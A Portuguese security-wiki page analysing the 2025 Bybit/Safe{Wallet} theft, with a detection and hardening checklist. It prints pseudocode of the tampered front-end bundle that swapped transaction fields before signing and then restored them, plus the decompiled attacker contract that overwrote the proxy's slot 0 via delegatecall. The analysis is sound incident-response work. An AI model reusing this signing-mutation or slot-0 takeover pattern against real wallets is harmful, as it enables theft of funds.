# Comprometimento do fluxo de assinatura Web3 e takeover de proxy Safe Delegatecall

{{#include ../../banners/hacktricks-training.md}}

## Visão geral

Uma cadeia de roubo de cold wallet combinou um **comprometimento da supply chain da interface web do Safe{Wallet}** com uma **primitive on-chain de delegatecall que sobrescreveu o ponteiro de implementação de um proxy (slot 0)**. Os principais pontos são:

- Se uma dApp puder injetar código no fluxo de assinatura, ela poderá fazer um signatário produzir uma **assinatura EIP-712 válida sobre campos escolhidos pelo atacante**, restaurando os dados originais da interface para que os outros signatários não percebam.
- Os proxies Safe armazenam `masterCopy` (implementação) no **storage slot 0**. Um delegatecall para um contrato que grava no slot 0 efetivamente faz o “upgrade” do Safe para uma lógica controlada pelo atacante, concedendo controle total da wallet.

## Off-chain: mutação direcionada de assinatura no Safe{Wallet}

Um bundle do Safe adulterado (`_app-*.js`) atacava seletivamente endereços específicos de Safe + signatário. A lógica injetada era executada imediatamente antes da chamada de assinatura:<sup>[[1]](#references)[[3]](#references)</sup>
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Propriedades do ataque
- **Context-gated**: allowlists codificadas para as Safes/vítimas e signers impediram ruído e reduziram a detecção.<sup>[[1]](#references)[[3]](#references)</sup>
- **Last-moment mutation**: os campos (`to`, `data`, `operation`, gas) eram sobrescritos imediatamente antes de `signTransaction` e depois restaurados, fazendo com que os payloads das propostas na UI parecessem benignos, enquanto as assinaturas correspondiam ao payload do atacante.
- **EIP-712 opacity**: as wallets exibiam dados estruturados, mas não decodificavam calldata aninhada nem destacavam `operation = delegatecall`, fazendo com que a mensagem modificada fosse efetivamente assinada às cegas.

### Relevância da validação do Gateway
As propostas de Safe são enviadas ao **Safe Client Gateway**. Antes da implementação de verificações reforçadas, o gateway podia aceitar uma proposta na qual `safeTxHash`/assinatura correspondessem a campos diferentes dos presentes no corpo JSON, caso a UI os reescrevesse após a assinatura. Após o incidente, o gateway passou a rejeitar propostas cujo hash/assinatura não corresponda à transação enviada. Uma verificação de hash semelhante no lado do servidor deve ser aplicada a qualquer API de orquestração de assinaturas.

### Destaques do incidente Bybit/Safe de 2025
- O esvaziamento da cold wallet da Bybit em 21 de fevereiro de 2025 (~401k ETH) reutilizou o mesmo padrão: um bundle S3 comprometido da Safe só era ativado para signers da Bybit e alterava `operation=0` → `1`, apontando `to` para um contrato do atacante pré-implantado que escrevia no slot 0.<sup>[[1]](#references)[[3]](#references)</sup>
- O `_app-52c9031bfa03da47.js` armazenado em cache no Wayback mostra a lógica vinculada à Safe da Bybit (`0x1db9…cf4`) e aos endereços dos signers, sendo imediatamente revertida para um bundle limpo dois minutos após a execução, reproduzindo o truque “mutate → sign → restore”.<sup>[[1]](#references)[[2]](#references)</sup>
- O contrato malicioso (por exemplo, `0x9622…c7242`) continha funções simples `sweepETH/sweepERC20` e uma `transfer(address,uint256)` que escrevia no implementation slot. A execução de `execTransaction(..., operation=1, to=contract, data=transfer(newImpl,0))` alterava a implementação do proxy e concedia controle total.<sup>[[1]](#references)[[3]](#references)</sup>

## On-chain: tomada de controle de proxy via Delegatecall por colisão de slots

Os proxies da Safe mantêm `masterCopy` no **storage slot 0** e delegam toda a lógica a ele. Como a Safe suporta **`operation = 1` (delegatecall)**, qualquer transação assinada pode apontar para um contrato arbitrário e executar seu código no contexto de storage do proxy.<sup>[[3]](#references)</sup>

Um contrato do atacante imitava um `transfer(address,uint256)` de ERC-20, mas, em vez disso, escrevia `_to` no slot 0:<sup>[[1]](#references)[[3]](#references)</sup>
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Caminho de execução:<sup>[[1]](#references)[[3]](#references)</sup>
1. As vítimas assinam `execTransaction` com `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. O masterCopy do Safe valida as assinaturas sobre esses parâmetros.
3. O proxy executa um delegatecall para `attackerContract`; o corpo de `transfer` grava no slot 0.
4. O slot 0 (`masterCopy`) agora aponta para uma lógica controlada pelo atacante → **takeover completo da wallet e fund drain**.

### Notas sobre Guard e versão (hardening pós-incidente)
- Safes >= v1.3.0 podem instalar um **Guard** para vetar `delegatecall` ou aplicar ACLs a `to`/selectors; o Bybit executava a v1.1.1, portanto nenhum hook de Guard existia. É necessário fazer upgrade dos contratos (e adicionar novamente os owners) para obter esse plano de controle.

## Lista de verificação de detecção e hardening

- **Integridade da UI**: fixar assets JS / SRI; monitorar diferenças entre bundles; tratar a signing UI como parte do limite de confiança.
- **Validação no momento da assinatura**: hardware wallets com **EIP-712 clear-signing**; exibir explicitamente `operation` e decodificar a calldata aninhada. Rejeitar a assinatura quando `operation = 1`, exceto quando permitido pela policy.
- **Verificações de hash no servidor**: gateways/serviços que retransmitem propostas devem recalcular `safeTxHash` e validar se as assinaturas correspondem aos campos enviados.
- **Policy/allowlists**: regras de preflight para `to`, selectors, tipos de ativos e desativação de delegatecall, exceto em flows avaliados. Exigir um serviço interno de policy antes de transmitir transações totalmente assinadas.
- **Design de contratos**: evitar expor delegatecall arbitrário em wallets multisig/treasury, exceto quando estritamente necessário. Posicionar os ponteiros de upgrade longe do slot 0 ou protegê-los com lógica explícita de upgrade e controle de acesso.
- **Monitoramento**: gerar alertas sobre execuções de delegatecall realizadas por wallets que mantêm fundos de treasury e sobre propostas que alteram `operation` em relação aos padrões habituais de `call`.

## Referências

- [1] [Análise forense do exploit do Bybit Safe pela AnChain.AI](https://www.anchain.ai/blog/bybit)
- [2] [Análise do comprometimento do bundle do Safe pela Zero Hour Technology](https://www.panewslab.com/en/articles/7r34t0qk9a15)
- [3] [Análise técnica detalhada do hack do Bybit (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [4] [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [5] [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
